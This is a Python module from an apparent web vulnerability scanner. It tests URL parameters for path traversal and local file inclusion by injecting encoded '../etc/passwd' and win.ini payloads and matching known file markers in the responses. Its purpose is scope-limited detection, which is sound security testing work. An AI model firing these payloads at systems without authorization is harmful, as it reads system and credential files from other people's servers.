from __future__ import annotations

from spiderforge.analysis.base import (
    ModuleContext,
    SecurityModule,
    body_text,
    extract_params,
    in_scope_urls,
    with_param,
)
from spiderforge.findings.models import Evidence, Finding, Severity

# Unix /etc/passwd markers
PASSWD_MARKERS = (
    "root:x:0:0",
    "root:*:0:0",
    "daemon:x:1:1",
    "bin:x:2:2",
    "/bin/bash",
    "/usr/sbin/nologin",
)
# Windows win.ini markers
WIN_MARKERS = ("[fonts]", "[extensions]", "for 16-bit app support")

PAYLOADS: tuple[str, ...] = (
    "../../../../../../etc/passwd",
    "../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "..\\..\\..\\..\\..\\windows\\win.ini",
)


class PathTraversalModule(SecurityModule):
    name = "path_traversal"
    category = "injection"
    description = "Detect file path traversal / LFI via content markers."

    async def run(self, ctx: ModuleContext) -> list[Finding]:
        findings: list[Finding] = []
        urls = in_scope_urls(ctx, require_params=True)[:15]

        for url in urls:
            for name, _original in extract_params(url):
                for payload in PAYLOADS:
                    test_url = with_param(url, name, payload)
                    if not ctx.scope.is_allowed(test_url):
                        continue
                    try:
                        resp = await ctx.client.get(test_url, follow_redirects=False)
                    except Exception:
                        continue
                    if resp.status_code >= 500:
                        continue
                    body = body_text(resp)

                    matched: list[str] = []
                    for marker in PASSWD_MARKERS:
                        if marker in body:
                            matched.append(marker)
                    for marker in WIN_MARKERS:
                        if marker in body:
                            matched.append(marker)
                    # Also: base64 decoded body may contain markers
                    if not matched:
                        import base64

                        try:
                            decoded = base64.b64decode(body, validate=True).decode(
                                "utf-8", errors="ignore"
                            )
                            for marker in PASSWD_MARKERS + WIN_MARKERS:
                                if marker in decoded:
                                    matched.append(f"base64:{marker}")
                        except Exception:
                            pass

                    if matched:
                        findings.append(
                            self.make_finding(
                                title=f"Path traversal / LFI in `{name}`",
                                category="path_traversal",
                                severity=Severity.HIGH,
                                url=url,
                                parameter=name,
                                description=(
                                    f"Payload `{payload}` returned content matching "
                                    f"`{matched[0]}`. The parameter likely reads "
                                    "files from the filesystem without proper "
                                    "sanitization."
                                ),
                                impact="Arbitrary file read; on misconfigured servers "
                                "may escalate to RCE (log poisoning, PHP wrappers, "
                                "etc.).",
                                remediation="Resolve the requested path against a "
                                "fixed root and reject any value that escapes it. "
                                "Prefer mapping user input to opaque identifiers.",
                                confidence=0.9,
                                evidence=Evidence(
                                    request=f"GET {test_url}",
                                    response=f"HTTP {resp.status_code}\n\n"
                                    + body[:3000],
                                    payload=payload,
                                    notes=f"markers={matched[:3]}",
                                ),
                                root_cause=f"path_traversal:{name}",
                            )
                        )
                        break
        return findings
